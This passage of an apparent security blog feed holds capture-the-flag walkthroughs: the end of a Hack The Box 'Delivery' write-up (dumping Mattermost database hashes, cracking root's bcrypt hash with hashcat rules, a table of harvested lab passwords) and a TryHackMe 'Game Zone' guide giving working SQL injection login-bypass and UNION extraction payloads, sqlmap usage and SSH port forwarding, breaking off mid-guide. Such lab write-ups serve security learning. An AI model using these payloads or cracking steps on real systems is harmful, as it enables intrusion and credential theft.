&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ grep -A3 mysql config.json
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DriverName&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSource&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSourceReplicas&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSourceSearchReplicas&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;,
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Logging into MySQL once more with the credentials shown above, we can get a list of Username/Passwords from its &lt;code&gt;Users&lt;/code&gt; table:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select Username,Password from mattermost.Users;&amp;#34;&lt;/span&gt;
Enter password:
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| syskey                           | $2a$10$qE1UXoCgvfrKIVqee1BGM.2a3qPxffsYVJ3aMg6g6N11QdrWokaCu |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These are, of course, hashed password values but ones that can potentially be cracked. Most users can be ommited as they seemingly have no associated password, as can the account for syskey as I created that.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;N.B&lt;/strong&gt; - Ask my team mates about me cracking hashes for passwords I&amp;rsquo;ve created&amp;hellip;&lt;/p&gt;
&lt;p&gt;The main hash that stands out here is the &amp;ldquo;root&amp;rdquo; hash so that&amp;rsquo;ll be the one to focus on for now.&lt;/p&gt;
&lt;p&gt;All that said, before proceeding with Hashcat, one other consideration here comes from the Mattermost internal server we discovered earlier. As well as login information, there was also this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root - 2:30 PM - Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of &amp;quot;PleaseSubscribe!&amp;quot;

root - 3:58 PM - PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Historically, ippsec has mentioned (as part of prior videos) Hashcat rules - namely the likes of &lt;code&gt;best64&lt;/code&gt;. These are rule sets that modify wordlists in interesting ways, to form new combinations without much manual work. In Kali these rulesets are already supplied, but in Parrot the rule files may be found here:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/share/doc/hashcat/rules&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With that and the following in a file that hashcat would target:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat delivery.htb
root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As well as the password variant in a file named &amp;lsquo;password&amp;rsquo;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat password
PleaseSubscribe!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can look to begin our cracking. One thing to note is that this particular hash is in bcrypt format which is notoriously bitchy to crack:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;$ hashcat --example-hashes | grep bcrypt -A1 -B1
MODE: &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt;
TYPE: bcrypt $2*$, Blowfish &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Unix&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Meaning our full command will be this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt; delivery.htb password -r /usr/share/hashcat/rules/best64.rule --user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;N.B&lt;/strong&gt; - Hashcat&amp;rsquo;s &lt;code&gt;--user&lt;/code&gt; flag just ensures that we don&amp;rsquo;t get a token length exception as a result of us having the username in the hash file.&lt;/p&gt;
&lt;p&gt;After a fairly short time we get a result:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt; delivery.htb passwords -r /usr/share/hashcat/rules/best64.rule --user --show
root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attempting to SSH directly to root using this password doesn&amp;rsquo;t let us connect, however using &lt;code&gt;su&lt;/code&gt; via the deliverer user does permit that access:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ su -
Password:
root@Delivery:~# ls -la
total &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;
drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 06:39 .
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 06:06 ..
lrwxrwxrwx  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 07:04 .bash_history -&amp;gt; /dev/null
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;570&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; .bashrc
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:33 .cache
drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; 13:41 .gnupg
-rwxr-x---  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 11:26 mail.sh
-r--------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;382&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 07:02 note.txt
-rw-r-----  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; .profile
-rw-r-----  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1499&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 10:55 py-smtp.py
-r--------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 root.txt
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; 14:28 .vim
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here&amp;rsquo;s the note from the author:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;root@Delivery:~# cat note.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ve seen several times.  The inspiration for the box is here:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Keep on hacking! And please don&amp;#39;&lt;/span&gt;t forget to subscribe to all the security streamers out there.

- ippsec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That said, the man is a complete legend and this box was fun to do. The foothold took me an embarassingly long time to get around but where there&amp;rsquo;s as will&amp;ndash; there&amp;rsquo;s a relative&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;credential-store&#34;&gt;Credential Store&lt;/h1&gt;
&lt;p&gt;Here&amp;rsquo;s a run down of the username and passwords collected during this box:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;User&lt;/th&gt;
&lt;th&gt;Password&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;maildeliverer&lt;/td&gt;
&lt;td&gt;Youve_G0t_Mail!&lt;/td&gt;
&lt;td&gt;via the Mattemost &amp;ldquo;Internal&amp;rdquo; group&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ost_user&lt;/td&gt;
&lt;td&gt;!H3lpD3sk123!&lt;/td&gt;
&lt;td&gt;/var/www/osticket/upload/include/ost-config.php&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mmuser&lt;/td&gt;
&lt;td&gt;Crack_The_MM_Admin_PW&lt;/td&gt;
&lt;td&gt;/opt/mattermost/config/config.json&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;root&lt;/td&gt;
&lt;td&gt;PleaseSubscribe!21&lt;/td&gt;
&lt;td&gt;Hashcat via Mattermost DB User Hashes&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;All in all I found this to be a well crafted, very unique box that demonstrates a vulnerability that could easily be found out in the wild. It also highlights a method I&amp;rsquo;ve never seen before; using generated helpdesk email addresses to intercept correspondence from other, associated, Single Sign On services. Utter genius.&lt;/p&gt;
&lt;p&gt;Finally, it would be remiss of me not to point this out: my HTB squad TargetRoot, namely my friend Coaran, got the root blood on this box some minutes after the user blood was taken. Please go and drop him, the team and (if you&amp;rsquo;re feeling extra nice) myself a respect hit and spread the love across this incredible community. One that, to this day, I&amp;rsquo;m proud to be part of.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-5ysk3y&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Game Zone - Linux</title>
      <link>https://5ysk3y.github.io/thm/guides/gamezone/</link>
      <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/thm/guides/gamezone/</guid>
      <description>Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone . This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, &lt;a href=&#34;https://tryhackme.com/room/gamezone&#34; target=&#34;_blank&#34;&gt;Gamezone&lt;/a&gt;
. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that. This was a really fun room so, let&amp;rsquo;s go!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As is standard, we start off our process with an nmap scan to determine what ports we can listen on:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 26 04:38:10 2020 as: nmap -Pn -sC -sV -oA initial -v 10.10.250.216
Nmap scan report for 10.10.250.216
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 04:38:24 2020 -- 1 IP address (1 host up) scanned in 14.22 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;As we can see, there&amp;rsquo;s 2 ports Open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH (7.2p2)&lt;/li&gt;
&lt;li&gt;Apache (2.4.18)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The main site on port 80 has no associated CMS - it looks bloody old. There&amp;rsquo;s a login form on the left side thats exploitable via cassic SQL injection, a la &lt;code&gt;admin&#39; OR 1=1 -- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This simple injection allows us to bypass the main login, however once we get to the &amp;ldquo;admin panel&amp;rdquo; there&amp;rsquo;s another SQL injectable form in the guise of a search field - passing this to burpsuite, we can start to enumerate number of columns in the table that&amp;rsquo;s being queried by default; we do this by using  &lt;code&gt;ORDER BY&lt;/code&gt;  and we continue to increment its value until we get an error. The following query was the last I submit &lt;em&gt;before&lt;/em&gt; I recieved an error indicating that, in this case, the target table has 3 colums:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; ORDER BY 3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we have this information we can then use &lt;code&gt;union&lt;/code&gt; to confirm we can inject information onto the page:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,2,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This produces &amp;ldquo;1,2,3&amp;rdquo; on the page and we can hijack one of these and replace it with a nested SQL statement or, to test, a string:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,&amp;quot;5ysk3y&amp;quot;,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This renders the word &lt;code&gt;5ysk3y&lt;/code&gt; on the page in place of the second colmn - if we replace that second value with a mySQL function instead, like &lt;code&gt;user()&lt;/code&gt;, we get &lt;code&gt;root@localhost&lt;/code&gt; printed on the page. So we can now start to enumerate stuff as we can get the page to output it.&lt;/p&gt;
&lt;p&gt;As the room asks us to use SQLMap, I&amp;rsquo;ll set that off while I manually exploit this in tandem. The SQLMap command I used is:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r $(pwd)/search.req --technique=U --batch&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B. As we know its UNION injectable, specifying &lt;code&gt;U&lt;/code&gt; as the technique allows us to target that specifically.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To manually exploit this we can reference the &lt;code&gt;INFORMATION SCHEMA&lt;/code&gt; database in MySQL - this contains stuff that MySQL itself uses to keep things in order, e.g. other database names as well as tonnes of related data - the &lt;code&gt;SCHEMATA&lt;/code&gt; table specifically contains the names of databases MySQL knows about. The following query would extract those:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As mentioned, to run another query as part of the union it needs to be &lt;code&gt;(nested)&lt;/code&gt; and, in order to view everything that matches our query (as there&amp;rsquo;s more than one value returned in the output) we wrap the target table in the group_concat() function. This gets us the following output on the page in place of the second column:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;information_schema, db, mysql, performance_schema, sys&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The schema/sys/mysql databases belong to MySQL, the &lt;code&gt;db&lt;/code&gt; database seems like it will contain data we may want.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/schemata-table.html&#34; target=&#34;_blank&#34;&gt;This&lt;/a&gt;
 is a particularly good reference for finding out what tables within INFORMATION_SCHEMA you can query to get information about other DB&amp;rsquo;s to use for further queries/enumeration.&lt;/p&gt;
&lt;p&gt;As we now have a database to target we can query the names of the tables within that database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = &#39;db&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gives us the name of the two tables inside this database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Posts, Users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From there we can start to enumerate the columns within those tables. In this case, I focused on the user table as it&amp;rsquo;s the most interesting:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#39;users&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This shows the following columns:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which means we can now do some more useful queries, such as:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select username from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a username:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;agent47&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we can also query the password as well:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select pwd from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a hash (this is an incomplete version; you&amp;rsquo;ll need to grab it yourself):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ab5db915fc9cea6c78df88106c6500-[truncated]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We could have also got this via SQLMap by including &lt;code&gt;--dump&lt;/code&gt; in our earlier command, but that&amp;rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;sqlmap resumed the following injection point(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; stored &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;:
&lt;span style=&#34;color:#75715e&#34;&gt;---
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Parameter&lt;/span&gt;: searchitem (POST)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query
    Title: Generic &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query (&lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; columns
    Payload: searchitem&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;test&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before moving on we must crack that hash to get our user password. I used John for this, although online tools exist to allow you to reverse it that way if you don&amp;rsquo;t have the facility to crack stuff. Due to THM guide rules, I&amp;rsquo;m not able to include this but, that said, aquiring it isn&amp;rsquo;t all that difficult once you have the hash.&lt;/p&gt;
&lt;p&gt;Success! We get a password. Using the login combination of &lt;code&gt;agent47:&amp;lt;REDACTED&amp;gt;&lt;/code&gt; we can now SSH into the machine and get our user flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running &lt;code&gt;ss&lt;/code&gt; to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&amp;rsquo;t appear on our nmap scan:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:10000                             *:*
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:68                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;                127.0.0.1:3306                      *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:10000                             *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:22                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::80                               :::*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::22                               :::*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a table to outline what the arguments denote:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone-ss.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Port 22, 80 and 3306 we can rule out as we know what they are - port 10000, on the other hand, is a little unconventional.&lt;/p&gt;
&lt;p&gt;It doesn&amp;rsquo;t show up on a full port scan so we can assume the firewall is blocking us. We can&amp;rsquo;t quite confirm just yet but it seems likely:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:~$ cat /etc/iptables/rules.v4
cat: /etc/iptables/rules.v4: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to look into this service, we need to use a &lt;em&gt;local&lt;/em&gt; tunnel via SSH to forward the port from the remote box, back to us, so that it&amp;rsquo;s accessible. In order to do this we can run the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.148.87
agent47@10.10.148.87&#39;s password:
